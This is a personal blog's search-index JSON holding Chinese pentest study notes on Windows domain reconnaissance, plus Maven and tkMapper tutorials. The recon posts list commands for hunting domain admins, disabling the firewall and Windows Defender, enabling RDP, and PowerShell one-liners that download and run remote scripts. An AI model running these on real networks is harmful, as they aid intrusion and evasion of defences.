{"meta":{"title":"BigBug","subtitle":"BigBugの博客","description":"博客因兴趣诞生,在不断完善中","author":"BigBug","url":"https://bigbug888.github.io","root":"/"},"pages":[{"title":"关于本站","date":"2020-04-19T04:58:56.000Z","updated":"2021-11-23T17:59:21.609Z","comments":false,"path":"about/index.html","permalink":"https://bigbug888.github.io/about/index.html","excerpt":"","text":"仙气の云彩“ 认识自我、超越自我 “ 那么你离成功就又进了一步！ 当你在项目中感觉所要学习的人和事越来越多时，说明你在 成长 。 当你感觉要责怪的人和事越来越少时，说明你在 成熟 。 当你在项目中不断获得了友谊和朋友时，说明你将取得项目的 成功 。 联系我B站：BigBug（萌新up） QQ：1211589590 （嘀嘀~，麻烦让一下，我要开车了！） 座右铭：既然选择了远方 便只顾风雨兼程"},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-06-27T12:40:24.587Z","comments":true,"path":"archives/index.html","permalink":"https://bigbug888.github.io/archives/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-11-24T07:12:19.000Z","updated":"2021-11-24T04:36:06.194Z","comments":false,"path":"categories/index.html","permalink":"https://bigbug888.github.io/categories/index.html","excerpt":"","text":""},{"title":"留言板","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-23T10:50:01.880Z","comments":false,"path":"comments/index.html","permalink":"https://bigbug888.github.io/comments/index.html","excerpt":"","text":""},{"title":"我的歌单","date":"2019-05-17T08:14:00.000Z","updated":"2021-07-26T13:06:52.537Z","comments":true,"path":"music/index.html","permalink":"https://bigbug888.github.io/music/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-07T14:17:49.000Z","updated":"2021-07-27T07:31:10.990Z","comments":true,"path":"link/index.html","permalink":"https://bigbug888.github.io/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-11-24T07:14:39.000Z","updated":"2021-07-26T14:44:42.337Z","comments":false,"path":"tags/index.html","permalink":"https://bigbug888.github.io/tags/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-23T15:05:37.940Z","updated":"2021-10-14T02:13:24.113Z","comments":false,"path":"List/gallery/index.html","permalink":"https://bigbug888.github.io/List/gallery/index.html","excerpt":"","text":"壁紙 世俗的欲望 OH MY GIRL 關於OH MY GIRL的圖片"},{"title":"Music-BBOX","date":"2020-04-23T04:58:56.000Z","updated":"2021-11-23T18:31:29.836Z","comments":false,"path":"List/music/index.html","permalink":"https://bigbug888.github.io/List/music/index.html","excerpt":"","text":""},{"title":"","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-23T17:03:45.509Z","comments":false,"path":"List/movies/index.html","permalink":"https://bigbug888.github.io/List/movies/index.html","excerpt":"","text":"励志视频"},{"title":"","date":"2021-09-28T14:56:13.000Z","updated":"2021-10-14T02:11:35.135Z","comments":false,"path":"List/gallery/wallpaper/index.html","permalink":"https://bigbug888.github.io/List/gallery/wallpaper/index.html","excerpt":"","text":""},{"title":"","date":"2021-09-28T14:56:14.000Z","updated":"2021-09-28T16:44:43.445Z","comments":false,"path":"List/gallery/ohmygirl/index.html","permalink":"https://bigbug888.github.io/List/gallery/ohmygirl/index.html","excerpt":"","text":""}],"posts":[{"title":"内网信息收集","slug":"域内信息收集","date":"2021-11-20T13:00:00.000Z","updated":"2021-11-26T03:52:38.470Z","comments":true,"path":"posts/16.html","link":"","permalink":"https://bigbug888.github.io/posts/16.html","excerpt":"","text":"域内信息收集域内基础信息Net view /domain 查看域 Net view /domain:xxx 查看xxx域内所有主机 Net group /domain 查看用户组列表 Net group “Domain Admins” /domain 查询域管理员列表 Net accounts /domain 查看域用户密码策略 Nltest /domain_trusts 查看域信任信息 遇到6118错误，可能是防火墙没有关闭或者server，workstation，computer browser未开启 域控制器的查找Nltest /DCLIST:XXX 查看域控制器的名称 Nslookup –type=SRV _ldap._tcp Net time /domain 查看域时间 Net group “domain controllers” /domain 查看所有域控制器 Netdom query pdc 查找域控制器 域内用户和管理员的获取查询所有域用户列表 Net user /domain 查看域用户列表 Wmic useraccount get /all 获取域内用户详细信息 Dsquery user dc上面的命令，查询用户 加 –name xxx查看某个用户信息 Net localgroup administrators /domain 查看administrators组内所有用户 查询域管理员用户组 Net group “domain admins” /domain Net group “Enterprise Admins” /domain 注意：这些域命令需要域权限（域用户）和system权限才能执行 定位域管理员wevtuil导出日志 会话 1，定位域管理员工具 Psloggedon.exe 查看本地登录的用户和通过本地计算机或远程计算机资 源登录的用户 PVEFindADUser.exe 查找活动目录用户登录的位置、枚举域用户（注意：需要安装.net框架才可以） Netsess.exe 查主机会话的工具 Nmap 的NSE脚本 Powerview 脚本-Invoke-UserHunter Powershell.exe –exec bypass –Command “&amp; {Import-Module C:\\PowerView.ps1; Invoke-UserHunter}” 查看域管理进程 本机检查 获取域管理员列表 net group “domain admins” /domain ⚫ 查看本机所有进程 Tasklist /v ⚫ 交叉(当前域有多少个管理员，本机所有进程有那些是域管理员运行的)域管理员 进程,然后模拟域管理进程从而获取域管理员权限 查询域管理进程 1，收集域控制器的列表 net group “domain controllers” /domain 2，收集域管理员的列表 net group “domain admins” /domain 3，使用netsess.exe查询每个域控制器，收集所有活动域会话的列表。 netsess.exe –h（查询主机会话） 4，将域管理员列表与活动会话列表交叉引用，以确定哪些ip地址具有活动域令牌 FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a 3. 扫描远程系统上的运行任务 收集域管理员的列表 net group “domain admins” /domain &gt; admins.txt net group “domain controllers” /domain &gt; dcs.txt FOR /F %i in (dcs.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause powershell优点：不会占用内存，不用写入到磁盘中去，需要用到.net框架 Powershell –exec bypass “import-module ./powerview.ps1;get-netdomain 上面情况估计是中文路径的锅","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"内网信息收集","slug":"内网信息收集","date":"2021-05-28T13:00:00.000Z","updated":"2021-11-25T21:19:42.097Z","comments":true,"path":"posts/3.html","link":"","permalink":"https://bigbug888.github.io/posts/3.html","excerpt":"","text":"内网信息收集工作组信息收集内网信息收集 查询网络配置：ipconfig /all 查询用户列表： 查询进程列表：tasklist /v 和 wmic process list brief 查询操作系统以及安装软件版本信息 获取操作系统和版本信息 查看安装软件以及版本，路径 查询端口列表 查询补丁列表 查询本机共享 查询防火墙相关配置 ​ 1，关闭防火墙 A，windows server 2003系统及以前版本 Netsh firewall set opmode disable ​ B，windows server 2003 之后系统版本 Netsh advfirewall set allprofiles state off/on ​ 2，查看防火墙配置 Netsh firewall show config 查询并且开启远程连接服务 查询并开启远程连接服务 查看远程连接端口号 Reg query “hkey_local_machine\\system\\currentcontrolset\\control\\terminal server\\winstations\\RDP-Tcp” /v portnumber 查看3389是否开启 Netstat –ano | findstr “3389” 开启远程连接服务 Windows server 2008和windows server 2016开启3389的方法 1, wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call setallowtsconnections 1 2, wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1 3, reg add “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限需要 查看当前权限 whoami（本地普通用户，域内用户bigbug888/administrator,whoami /all Net user bigbug888/domain 域内信息收集 判断是否有域 Iipconfig /all 和Systeminfo WORKGROUP 和Net config workstation 和Net time /domain 域内存活主机探测 利用netbios快速探测内网（网络邻居协议，优先） 工具：nbtscan 遇到win2016杀毒软件windows defender关不掉可在管理员cmd下输入（如果还是关不掉可以重启，可能是虚拟机没反应过来） reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD 使用vbs脚本 Cscript 1.vbs 利用arp扫描完整探测内网， arp-scan 命令 apr.exe -t ip arp.exe -t 192,168,5.0/24 empire中的arpscan模块 invoke-arpscan.ps1 ps命令： 远程下载运行：powershell –nop –exec bypass –c “IEX（new-Object net.webClient）.DownloadString(‘http://192.168.1.1/invoke-arpscan.ps1’);invoke-arpscan –CIDR 192.168.1.0/24”&gt;&gt;c:\\windows\\temp\\log.txt 本地运行：powershell.exe -exec bypass -Command \"Import-Module ./Invoke\u0002ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.5.0/24” 利用常规的tcp/udp端口扫描探测内网 工具：scanline 命令： sl –h –t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 –u 53,161,137,139 –o c:\\windows\\temp\\sl_res.txt –p 192.168.5.1-254 /b 域内端口扫描（注：扫描的时候要注意是否会触发IDS等安全设备警告） 端口的banner信息 端口上运行的服务 常见应用的默认端口 telnet命令 命令：telnet ip端口 Nmap工具扫描 Metasploit模块 search portscan invoke-portscan.ps1 powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,80,8080,3389' -oA c:\\ProgramData\\ip_info\" ​ 域内基础信息收集： Net view /domain 查看域 Net view /domain:xxx 查看xxx域内所有主机 Net group /domain 查看用户组列表 Net group “Domain Admins” /domain 查询域管理员列表 Net accounts /domain 查看域用户密码策略 Nltest /domain_trusts 查看域信任信息 注意：这些域命令需要域权限（域用户）或system权限才能执行 ​ ​ 域控制器的查找 Nltest /DCLIST:XXX 查看域控制器的名称 Nslookup –type=SRV _ldap._tcp Net time /domain 查看域时间 Net group “domain controllers” /domain 查看所有域控制器 Netdom query pdc 查找域控制器 ​ 域内用户和管理员的获取 查询所有域用户列表 Net user /domain 查看域用户列表 Wmic useraccount get /all 获取域内用户详细信息 Dsquery user dc上面的命令，查询用户 加 –name xxx查看某个用户信息 Net localgroup administrators /domain 查看administrators组内所有用户 ​ 域内用户和管理员的获取 查询域管理员用户组 Net group “domain admins” /domain Net group “Enterprise Admins” /domain ​ 定位域管理员 ​ 常规的定位域管理员的方法： ​ 1.日志（指的是本地机器的管理员日志，可以使用脚本或者wevtutil导出查看） ​ 2.会话（是域内每个机器的登录绘画，可以匿名查询，无需权限，可以使用netsess.exe或者powerview等工具查询） ​ 常规定位域管理员的方法 ​ 1.定位管理员工具 ​ 2.查询域管理进程 ​ 3.模拟域管理员 1，定位域管理员工具 Psloggedon.exe 查看本地登录的用户和通过本地计算机或远程计算机资 源登录的用户 PVEFindADUser.exe 查找活动目录用户登录的位置、枚举域用户 Netsess.exe 查主机会话的工具 Nmap 的NSE脚本 Powerview 脚本-Invoke-UserHunter Powershell.exe –exec bypass –Command “&amp; {Import-Module C:\\PowerView.ps1; Invoke-UserHunter}” 查询域管理进程 本机检查 获取域管理员列表 查看本机所有进程 交叉 查询域控制器的域用户会话 收集域控制器的列表 收集域管理员的列表 使用netsess.exe查询每个域控制器 将域管理员列表与活动会话列表交叉引用 扫描远程系统的运行任务 收集域管理员的列表 net group \"Domain Admins\" /domain &gt; admins.txt net group \"Domain Controllers\" /domain &gt; dcs.txt for /F %i in (dcs.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr/I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i使用nbtscan工具，就文件与该工具置于同一目录下for /F %i in (dcs.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr/I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"内网环境搭建1","slug":"内网渗透环境搭建1","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:12:35.101Z","comments":true,"path":"posts/2.html","link":"","permalink":"https://bigbug888.github.io/posts/2.html","excerpt":"","text":"1.windows server 2016管理-&gt;添加新角色 2.安装域控制器和dns服务勾选active directory域服务器，dns服务器 3.设置ip 4.更改计算机名字 5.升级服务器（升级为域控）遇到下面这种情况是因为电脑管理员密码没有设置 6.创建active directory用户然后使用win7加入该域","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Maven聚合工程","slug":"04-锋迷商城-随堂笔记/02-Maven/Maven聚合工程","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:17:24.752Z","comments":true,"path":"posts/10.html","link":"","permalink":"https://bigbug888.github.io/posts/10.html","excerpt":"","text":"Maven聚合工程1 Maven聚合工程概念 Maven聚合工程：就是可以在一个Maven父工程中创建多个组件(项目)，这个多个组件之间可以相互依赖，实现组件的复用 2 创建Maven聚合工程2.1 创建Maven父工程 Maven聚合工程的父工程 packing必须为 pom 创建一个Maven工程 修改父工程的pom.xml，设置打包方式为pom &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;maven-parent&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;/project&gt; 父工程用于管理子工程，不进行业务实现，因此src目录可以选择性删除 2.2 创建Module 选择父工程—右键—New—Module 输入子工程名称（g和v都从父工程继承） 子工程的pom文件： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;!--module的pom继承 父工程的pom--&gt; &lt;parent&gt; &lt;artifactId&gt;maven-parent&lt;/artifactId&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;/project&gt; 父工程的pom文件： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;maven-parent&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;!-- 声明当前父工程的子module --&gt; &lt;modules&gt; &lt;module&gt;common&lt;/module&gt; &lt;/modules&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;/project&gt; 3 Maven聚合工程依赖继承3.1 依赖继承 在父工程的pom文件添加的依赖，会被子工程继承 3.2 依赖版本管理 在父工程的pom.xml的dependencyManagement中添加依赖，表示定义子工程中此依赖的默认版本（此定义并不会让子工程中添加当前依赖） &lt;!-- 依赖管理：在dependencyManagement中添加依赖，表示定义子工程中此依赖的默认版本 --&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt; &lt;artifactId&gt;gson&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt;","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"tkmapper","slug":"04-锋迷商城-随堂笔记/03-tkMapper/tkMapper","date":"2021-05-27T13:00:00.000Z","updated":"2021-11-25T19:18:08.811Z","comments":true,"path":"posts/11.html","link":"","permalink":"https://bigbug888.github.io/posts/11.html","excerpt":"","text":"一、 DAO层的实现的规律 实体类与数据表存在对应关系，并且是有规律的——只要知道了数据表的结构，就能够生成实体类； 所有实体的DAO接口中定义的方法也是有规律的，不同点就是实体类型不同 UserDAO public interface UserDAO extends GeneralDAO&lt;User&gt;{ public int insert(User t); } GoodsDAO public interface GoodsDAO extends GeneralDAO&lt;Goods&gt; { public int insert(Goods t); } GeneralDAO public interface GeneralDAO&lt;T&gt;{ //通用方法 public int insert(T t); public T queryOneByPrimarykey(int i); } 对于GeneralDAO接口定义的数据库操作方法因为使用了泛型，无需映射文件；对于UserDAO和GoodsDAO需要映射文件，所有DAO的相同操作的映射文件也是有规律可循的 UserMapper &lt;insert id=\"insert\"&gt; insert into users(user_id,username) values(#{userId},#{username}) &lt;/insert&gt; @Table(\"users\") public class User{ @Id @Column(\"user_id\") private int userId; @Column(\"username\") private String username; } GoodsMapper &lt;insert id=\"insert\"&gt; insert into goods(goods_id,goods_name) values(#{goodsId},#{goodsName}) &lt;/insert&gt; @Table(\"product\") public class Goods{ @Id @Column(\"goods_id\") private int goodsId; @Column(\"goods_name\") private String goodsName; } 二、tkMapper简介 基于MyBatis提供了很多第三方插件，这些插件通常可以完成数据操作方法的封装（GeneralDAO）、数据库逆向工程工作(根据数据表生成实体类、生成映射文件) MyBatis-plus tkMapper tkMapper就是一个MyBatis插件，是在MyBatis的基础上提供了很多工具，让开发变得简单，提高开发效率。 提供了针对单表通用的数据库操作方法 逆向工程（根据数据表生成实体类、dao接口、映射文件） 三、tkMapper整合3.1 基于SpringBoot完成MyBatis的整合3.2 整合tkMapper3.2.1 添加tkMapper的依赖&lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.5&lt;/version&gt; &lt;/dependency&gt; 3.2.2 修改启动类的@MapperScan注解的包 为tk.mybatis.spring.annotation.MapperScan import tk.mybatis.spring.annotation.MapperScan; @SpringBootApplication @MapperScan(\"com.qfedu.tkmapperdemo.dao\") public class TkmapperDemoApplication { public static void main(String[] args) { SpringApplication.run(TkmapperDemoApplication.class, args); } } 四、tkMapper使用4.1 创建数据表CREATE TABLE `users` ( `user_id` int(64) NOT NULL AUTO_INCREMENT COMMENT '主键id 用户id', `username` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名 用户名', `password` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码 密码', `nickname` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '昵称 昵称', `realname` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '真实姓名 真实姓名', `user_img` varchar(1024) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '头像 头像', `user_mobile` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机号 手机号', `user_email` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱地址 邮箱地址', `user_sex` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '性别 M(男) or F(女)', `user_birth` date NULL DEFAULT NULL COMMENT '生日 生日', `user_regtime` datetime(0) NOT NULL COMMENT '注册时间 创建时间', `user_modtime` datetime(0) NOT NULL COMMENT '更新时间 更新时间', PRIMARY KEY (`user_id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户 ' ROW_FORMAT = Compact; 4.2 创建实体类@Data @NoArgsConstructor @AllArgsConstructor public class User { private int userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; } 4.3 创建DAO接口 tkMapper已经完成了对单表的通用操作的封装，封装在Mapper接口和MySqlMapper接口；因此如果我们要完成对单表的操作，只需自定义DAO接口继承Mapper接口和MySqlMapper接口 public interface UserDAO extends Mapper&lt;User&gt;, MySqlMapper&lt;User&gt; { } 4.4 测试@RunWith(SpringRunner.class) @SpringBootTest(classes = TkmapperDemoApplication.class) public class UserDAOTest { @Autowired private UserDAO userDAO; @Test public void test(){ User user = new User(); user.setUsername(\"aaaa\"); user.setPassword(\"1111\"); user.setUserImg(\"img/default.png\"); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDAO.insert(user); System.out.println(i); } } 五、tkMapper提供的方法@RunWith(SpringRunner.class) @SpringBootTest(classes = TkmapperDemoApplication.class) public class CategoryDAOTest { @Autowired private CategoryDAO categoryDAO; @Test public void testInsert(){ Category category = new Category(0,\"测试类别3\",1,0,\"03.png\",\"xixi\",\"aaa.jpg\",\"black\"); //int i = categoryDAO.insert(category); int i = categoryDAO.insertUseGeneratedKeys(category); System.out.println(category.getCategoryId()); assertEquals(1,i); } @Test public void testUpdate(){ Category category = new Category(48,\"测试类别4\",1,0,\"04.png\",\"heihei\",\"aaa.jpg\",\"black\"); int i = categoryDAO.updateByPrimaryKey(category); // 根据自定义条件修改，Example example就是封装条件的 // int i1 = categoryDAO.updateByExample( Example example); assertEquals(1,i); } @Test public void testDelete(){ int i = categoryDAO.deleteByPrimaryKey(48); // 根据条件删除 //int i1 = categoryDAO.deleteByExample(Example example); assertEquals(1,i); } @Test public void testSelect1(){ //查询所有 List&lt;Category&gt; categories = categoryDAO.selectAll(); for (Category category: categories) { System.out.println(category); } } @Test public void testSelect2(){ //根据主键查询 Category category = categoryDAO.selectByPrimaryKey(47); System.out.println(category); } @Test public void testSelect3(){ //条件查询 //1.创建一个Example封装 类别Category查询条件 Example example = new Example(Category.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"categoryLevel\",1); criteria.orLike(\"categoryName\",\"%干%\"); List&lt;Category&gt; categories = categoryDAO.selectByExample(example); for (Category category: categories) { System.out.println(category); } } @Test public void testSelect4(){ //分页查询 int pageNum = 2; int pageSize = 10; int start = (pageNum-1)*pageSize; RowBounds rowBounds = new RowBounds(start,pageSize); List&lt;Category&gt; categories = categoryDAO.selectByRowBounds(new Category(), rowBounds); for (Category category: categories) { System.out.println(category); } //查询总记录数 int i = categoryDAO.selectCount(new Category()); System.out.println(i); } @Test public void testSelect5(){ //带条件分页 //条件 Example example = new Example(Category.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"categoryLevel\",1); //分页 int pageNum = 2; int pageSize = 3; int start = (pageNum-1)*pageSize; RowBounds rowBounds = new RowBounds(start,pageSize); List&lt;Category&gt; categories = categoryDAO.selectByExampleAndRowBounds(example,rowBounds); for (Category category: categories) { System.out.println(category); } //查询总记录数（满足条件） int i = categoryDAO.selectCountByExample(example); System.out.println(i); } } 六、在使用tkMapper是如何进行关联查询6.1 所有的关联查询都可以通过多个单表操作实现//查询用户同时查询订单 Example example = new Example(User.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"username\",\"zhangsan\"); //根据用户名查询用户 //1.先根据用户名查询用户信息 List&lt;User&gt; users = userDAO.selectByExample(example); User user = users.get(0); //2.再根据用户id到订单表查询订单 Example example1 = new Example(Orders.class); Example.Criteria criteria1 = example1.createCriteria(); criteria1.andEqualTo(\"userId\",user.getUserId()); List&lt;Orders&gt; ordersList = orderDAO.selectByExample(example1); //3.将查询到订单集合设置到user user.setOrdersList(ordersList); System.out.println(user); 6.2 自定义连接查询 在使用tkMapper,DAO继承Mapper和MySqlMapper之后，还可以自定义查询 6.2.1 在DAO接口自定义方法public interface UserDAO extends GeneralDAO&lt;User&gt; { public User selectByUsername(String username); } 6.2.2 创建Mapper文件&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.qfedu.fmmall.dao.UserDAO\"&gt; &lt;insert id=\"insertUser\"&gt; insert into users(username,password,user_img,user_regtime,user_modtime) values(#{username},#{password},#{userImg},#{userRegtime},#{userModtime}) &lt;/insert&gt; &lt;resultMap id=\"userMap\" type=\"User\"&gt; &lt;id column=\"user_id\" property=\"userId\"/&gt; &lt;result column=\"username\" property=\"username\"/&gt; &lt;result column=\"password\" property=\"password\"/&gt; &lt;result column=\"nickname\" property=\"nickname\"/&gt; &lt;result column=\"realname\" property=\"realname\"/&gt; &lt;result column=\"user_img\" property=\"userImg\"/&gt; &lt;result column=\"user_mobile\" property=\"userMobile\"/&gt; &lt;result column=\"user_email\" property=\"userEmail\"/&gt; &lt;result column=\"user_sex\" property=\"userSex\"/&gt; &lt;result column=\"user_birth\" property=\"userBirth\"/&gt; &lt;result column=\"user_regtime\" property=\"userRegtime\"/&gt; &lt;result column=\"user_modtime\" property=\"userModtime\"/&gt; &lt;/resultMap&gt; &lt;select id=\"queryUserByName\" resultMap=\"userMap\"&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username=#{name} &lt;/select&gt; &lt;/mapper&gt; 七、逆向工程 逆向工程，根据创建好的数据表，生成实体类、DAO、映射文件 7.1 添加逆向工程依赖 是依赖是一个mybatis的maven插件 &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.5&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;3.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; 7.2 逆向工程配置 在resources/generator目录下创建generatorConfig.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\" \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\"&gt; &lt;generatorConfiguration&gt; &lt;!-- 引入数据库连接配置 --&gt; &lt;!-- &lt;properties resource=\"jdbc.properties\"/&gt;--&gt; &lt;context id=\"Mysql\" targetRuntime=\"MyBatis3Simple\" defaultModelType=\"flat\"&gt; &lt;property name=\"beginningDelimiter\" value=\"`\"/&gt; &lt;property name=\"endingDelimiter\" value=\"`\"/&gt; &lt;!-- 配置 GeneralDAO --&gt; &lt;plugin type=\"tk.mybatis.mapper.generator.MapperPlugin\"&gt; &lt;property name=\"mappers\" value=\"com.qfedu.tkmapperdemo.general.GeneralDAO\"/&gt; &lt;/plugin&gt; &lt;!-- 配置数据库连接 --&gt; &lt;jdbcConnection driverClass=\"com.mysql.jdbc.Driver\" connectionURL=\"jdbc:mysql://localhost:3306/fmmall2\" userId=\"root\" password=\"admin123\"&gt; &lt;/jdbcConnection&gt; &lt;!-- 配置实体类存放路径 --&gt; &lt;javaModelGenerator targetPackage=\"com.qfedu.tkmapperdemo.beans\" targetProject=\"src/main/java\"/&gt; &lt;!-- 配置 XML 存放路径 --&gt; &lt;sqlMapGenerator targetPackage=\"/\" targetProject=\"src/main/resources/mappers\"/&gt; &lt;!-- 配置 DAO 存放路径 --&gt; &lt;javaClientGenerator targetPackage=\"com.qfedu.tkmapperdemo.dao\" targetProject=\"src/main/java\" type=\"XMLMAPPER\"/&gt; &lt;!-- 配置需要指定生成的数据库和表，% 代表所有表 --&gt; &lt;table tableName=\"%\"&gt; &lt;!-- mysql 配置 --&gt; &lt;!-- &lt;generatedKey column=\"id\" sqlStatement=\"Mysql\" identity=\"true\"/&gt;--&gt; &lt;/table&gt; &lt;!-- &lt;table tableName=\"tb_roles\"&gt;--&gt; &lt;!-- 